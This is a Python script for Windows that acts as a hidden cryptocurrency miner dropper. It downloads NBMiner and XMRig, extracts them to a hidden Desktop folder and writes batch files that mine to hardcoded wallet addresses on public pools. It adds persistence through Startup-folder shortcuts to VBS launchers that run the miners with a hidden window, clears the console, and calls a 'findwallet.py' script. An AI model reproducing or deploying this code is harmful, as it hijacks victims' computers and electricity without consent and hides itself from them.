import requests as r
import os,threading
import zipfile
import time
import  win32com.client
import subprocess,time
import random
lg = os.getlogin()
path = os.getcwd()+'\\'

docloc = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hello.lnk'
srt1 = os.path.exists(docloc)
srt2 = os.path.exists(f'C:\\Users\\{lg}\\Contacts\\st.vbs')
def clss():
    time.sleep(0.4)
    os.system('cls')
def start():
    threading.Thread(target=clss).start()
    proc = subprocess.call(f'cscript C:\\Users\\{lg}\\Contacts\\st.vbs',shell=False)
if not srt1 or not srt2:
    def set_sr():
        st = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        #desktop = r"path to where you wanna put your .lnk file"
        pat = os.path.join(st, 'hello.lnk')
        
        t = f'C:\\Users\\{lg}\\Contacts\\st.vbs'
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(pat)
        shortcut.Targetpath = t
        shortcut.save()
        st = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        #desktop = r"path to where you wanna put your .lnk file"
        pat = os.path.join(st, 'hello2.lnk')
        
        t = f'C:\\Users\\{lg}\\Contacts\\st1.vbs'
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(pat)
        shortcut.Targetpath = t
        shortcut.save()

    url = 'https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip'
    req = r.get(url,{})
    r2 = r.get('https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip',{})
    path_to_zip_file = f'C:\\Users\\{lg}\\Desktop'

    time.sleep(0.4)
    with open(path_to_zip_file+r'\x.zip', 'wb') as w:
        w.write(req.content)
    with open(path_to_zip_file+r'\x2.zip', 'wb') as zipp:
        zipp.write(r2.content)
    
    with zipfile.ZipFile(path_to_zip_file+r'\x.zip', 'r') as zip_ref:
        zip_ref.extractall(path_to_zip_file+r'\extracted')
        
    with zipfile.ZipFile(path_to_zip_file+r'\x2.zip', 'r') as zip_ref:
        zip_ref.extractall(path_to_zip_file+r'\extracted')
        
    os.remove(path_to_zip_file+r'\x.zip')
    os.remove(path_to_zip_file+r'\x2.zip')
    fn = path_to_zip_file + r'\extracted'
    p = os.popen('attrib +h ' + fn)

    t = f'C:\\Users\\{lg}\\Desktop\\extracted\\NBMiner_Win\\'+ r'run.bat'
    with open(t, 'w') as w:
        w.write(f'@cd /d "%~dp0"\nnbminer -a etchash -o stratum+tcp://asia1-etc.ethermine.org:14444 -u 0x4233d2697136724563d3766593FfAa379E5d6fb0.client_{random.randint(0,100000)} \npause')
  
    with open(f'C:\\Users\\{lg}\\Desktop\\extracted\\xmrig-6.18.1\\run.bat','w') as tr:
        tr.write('cd %~dp0\nxmrig.exe -o xmr.2miners.com:2222 -u 451dZaseUfYeT7fsHEuoZSi1e4j7r81vqh4ay2pgzP8qDP7VW4UGqBMZTHxfeUMm774b8qAZcK61SHYS1SzJ8CJLPUEfpe7 -p x\npause')
    set_sr()
    with open(f'{path}st.bat', 'w') as startDoc:
        startDoc.write(f'start "" "{docloc}"')
    with open(f'C:\\Users\\{lg}\\Contacts\\st1.vbs','w') as st1:
        st1.write(f'''Set shell = WScript.CreateObject("WScript.Shell")
                 shell.Run("C:\\Users\\{lg}\\Desktop\\extracted\\xmrig-6.18.1\\run.bat"), 0, True''')
    with open(f'C:\\Users\\{lg}\\Contacts\\st.vbs','w') as st:
        st.write(f'''Set shell = WScript.CreateObject("WScript.Shell")
                shell.Run("C:\\Users\\{lg}\\Desktop\\extracted\\NBMiner_Win\\run.bat"), 0, True''')
with open(f"{path}start.bat",'w') as ww:
    ww.write('start secondary.bat\npython findwallet.py\npause')
threading.Thread(target=start).start()
